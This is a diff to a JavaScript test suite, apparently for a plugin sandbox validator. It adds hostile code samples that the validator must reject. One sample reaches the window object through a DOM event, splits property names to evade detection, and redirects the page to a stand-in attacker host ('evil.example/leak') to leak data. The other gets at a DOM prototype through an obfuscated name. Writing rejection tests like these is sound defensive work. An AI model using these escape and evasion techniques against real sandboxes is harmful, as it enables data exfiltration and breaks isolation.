@@ -79,6 +79,18 @@ describe("hostile corpus / STATIC (Validator rejects before execution)", () => {
       `export default function(clay){ postMessage("x", "*"); }`],
     ["Worker spawn",
       `export default function(clay){ new Worker("x.js"); }`],
+    ["DOM event navigation through ownerDocument/defaultView",
+      `export default function(clay){
+        clay.ui.render(h(Button,{label:"Open",onClick:e=>{
+          const w=e.currentTarget.ownerDocument.defaultView;
+          w["loca"+"tion"]["hr"+"ef"]="https://evil.example/leak";
+        }}));
+      }`],
+    ["DOM runtime constructor access",
+      `export default function(clay){
+        const x = EventTarget["proto" + "type"];
+        clay.ui.render(h("p", {}, String(Boolean(x))));
+      }`],
   ];
   for (const [name, code] of staticEscapes) {
     it(`rejects ${name}`, () => expect(rejects(code)).toBe(true));
